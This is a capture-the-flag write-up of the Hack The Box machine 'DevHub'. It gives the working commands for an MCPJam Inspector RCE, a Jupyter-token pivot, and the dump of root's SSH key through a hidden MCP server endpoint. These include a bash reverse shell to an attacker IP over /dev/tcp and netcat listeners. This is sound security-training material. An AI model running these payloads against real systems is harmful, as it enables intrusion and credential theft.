---
layout: post
title: "HTB DevHub Write-up (Season 11)"
date: 2026-08-02 15:35:00
description: RCE on MCPJam Inspector, lateral movement via Jupyter/websocat, and root privilege escalation through a hidden endpoint on an internal MCP server.
tags: [htb, writeup, linux, mcp, rce, privesc]
categories: [Write-ups]
giscus_comments: true
related_posts: false
---

**Machine**: DevHub (HTB Season 11) — Medium, Linux
**Author**: DoOm / ppporrkkky
**HTB profile**: [https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de](https://profile.hackthebox.com/profile/019c56c9-a8f8-721d-ad7b-fd7b3dd2f9de)

## Reconnaissance

Once the target IP is obtained, recon starts with `nmap`:

```
nmap 10.129.245.216 -T5 -sCV -p-
```

The scan reveals three open ports:

- **22/tcp** — OpenSSH 8.9p1 (Ubuntu)
- **80/tcp** — nginx 1.18.0, redirecting to `http://devhub.htb/`
- **6274/tcp** — unrecognized by nmap, but the response fingerprint identifies a **MCPJam Inspector** instance

Visiting the site on port 80 reveals an internal landing page titled **DevHub — Internal Development & Analytics Platform**, referencing three services:

- **MCP Inspector** — active on port 6274
- **Analytics Dashboard** — a Jupyter environment, restricted to `localhost:8888`
- **Code Repository** — an internal Git server, in maintenance mode

The Jupyter service on localhost:8888 is noted as a potential attack surface, but isn't the immediate priority.

## Initial exploitation — RCE on MCPJam Inspector

Port 6274 exposes an MCP server reachable from the internet. The **Settings** page of the interface reveals the exact software version:

```
MCPJam Version: v1.4.2
```

A search on GitHub Security Advisories confirms this version is vulnerable:

> **GHSA-232v-j27c-5pp6** — REC in MCPJam inspector due to HTTP Endpoint exposes (Critical severity)
> Package `@mcpjam/inspector` (npm) — affected versions: `<= 1.4.2`, patched in `1.4.3`

The official GitHub Advisory PoC allows RCE through a simple HTTP request:

```bash
curl http://<target>:6274/api/mcp/connect --header "Content-Type: application/json" --data \
  "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

In this case, the target is very likely a Linux machine, so the PoC is adapted using a Python variant available on Exploit-DB ([exploit 52625](https://www.exploit-db.com/exploits/52625)) to get a reverse shell instead.

After starting a listener:

```bash
nc -lvnp 4444
```

… the exploit is launched with matching parameters (attacker IP and port). A shell is obtained:

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

### Shell stabilization

To upgrade this basic reverse shell into a fully interactive one:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Once the PTY spawns, `Ctrl+Z` backgrounds it on the attacker side, then:

```bash
stty raw -echo; fg
```

After `fg`, press Enter twice, then on the remote shell:

```bash
export TERM=xterm
```

This enables coloring, `clear`, and interactive programs like `vim` or `less`. (A simpler alternative, if `rlwrap` is installed on the attacker side, is starting the listener directly with `rlwrap nc -lvnp 4444`, which gives command history and line editing without the Python upgrade.)

## System enumeration and lateral movement

Once the shell is stable, `linpeas.sh` is run to enumerate the system. Two things stand out in the process list:

1. **A Jupyter server started by user `analyst`**, bound to localhost, with a **hardcoded token** visible in the command line:

```
/home/analyst/jupyter-env/bin/python3 -m jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser \
  --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
```

2. **A cron job run by `root`** executing a Python script:

```
root  /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The hardcoded Jupyter token enables lateral movement to the `analyst` user. Interacting with the Jupyter API allows creating a remote terminal session:

```bash
curl -X POST 'http://127.0.0.1:8888/api/terminals' \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  -H 'Content-Type: application/json' \
  -d '{"cwd":""}' \
  -i
```

Response: `{"name": "1", "last_activity": "2026-08-02T13:01:56.865857Z"}` — a terminal ID (`1`) is returned.

Commands are then sent over websocket using [websocat](https://github.com/vi/websocat/releases/download/v1.13.0/websocat.x86_64-unknown-linux-musl):

```bash
echo '["stdin", "ls -la\r"]' | ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

This gives an interactive session as `analyst`. For a more comfortable working environment, a reverse shell is triggered toward a second listener:

```bash
nc -lvnp 9000
```

```bash
echo '["stdin", "bash -i >& /dev/tcp/<attacker_IP>/9000 0>&1\r"]' | ./websocat.x86_64-unknown-linux-musl \
  "ws://127.0.0.1:8888/terminals/websocket/1?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

The `analyst` shell is obtained and stabilized the same way as before. The user flag is found in `~/user.txt`.

## Privilege escalation — hidden endpoint on the OpsMCP server

Listing `analyst`'s home directory reveals an interesting file: `.opsmcp_key`.

```
analyst@devhub:~$ cat .opsmcp_key
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

The file name matches the earlier root cron job (`/opt/opsmcp/server.py`). Inspecting `/opt/opsmcp/` shows `server.py` is owned by `analyst` (read-only):

```
analyst@devhub:~$ ls -la /opt/opsmcp/
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

**OpsMCP** is an MCP (Model Context Protocol) server geared toward system operations: it exposes system administration tools (command execution, file access, process management, logs, services) to an LLM through the MCP protocol. Since it runs as **root**, any exploitable tool in this server executes with root privileges.

Reading `server.py`, the hardcoded API key matches `.opsmcp_key` exactly:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The server listens locally on port 5000:

```python
app.run(host='127.0.0.1', port=5000, debug=False)
```

Listing available tools via the API:

```bash
curl 127.0.0.1:5000/tools/list -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

… only returns 4 "public" tools (`ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`). However, reading the full `server.py` source reveals an unlisted tool: **`ops._admin_dump`**, which dumps sensitive credentials (root SSH private key, or password hashes), gated behind a `confirm=true` parameter.

Triggering this hidden endpoint to retrieve root's SSH private key:

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

The response contains root's private key, with escaped newlines (`\n`). A small Python script cleans it up before use:

```python
#!/usr/bin/env python3
import os, subprocess, sys

def sanitize_key(input_path="enigma_root_key"):
    try:
        print(f"[*] Processing file: {input_path}")
        try:
            subprocess.run(["dos2unix", input_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            print("[+] dos2unix conversion successful.")
        except (FileNotFoundError, subprocess.CalledProcessError):
            print("[-] 'dos2unix' not available, cleaning manually...")
        with open(input_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        content = content.replace("\\n", "\n").replace("\r\n", "\n")
        content = content.rstrip("\\").strip()
        content = content.rstrip("\n") + "\n"
        with open(input_path, "w", encoding="utf-8") as f:
            f.write(content)
        os.chmod(input_path, 0o400)
        print(f"[+] Key cleaned and permissions (400) applied to '{input_path}'.")
    except Exception as e:
        print(f"[-] Critical error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    target_file = sys.argv[1] if len(sys.argv) > 1 else "enigma_root_key"
    sanitize_key(target_file)
```

```bash
python3 sanitize_key.py enigma_root_key
chmod 400 enigma_root_key
ssh -i enigma_root_key root@10.129.245.216
```

Root access is obtained. The root flag is found in `/root/root.txt`.

## Recommendations

- Regularly patch exposed applications and frameworks (MCPJam Inspector in particular).
- Never hardcode tokens or API keys in scripts or in process command lines visible to other local users.
- Avoid implementing critical, destructive functionality (like dumping the root SSH key) behind an API, even a "hidden" one — security through obscurity is not real protection.
- Restrict permissions on root-owned cron jobs that interact with components writable by lower-privileged accounts.
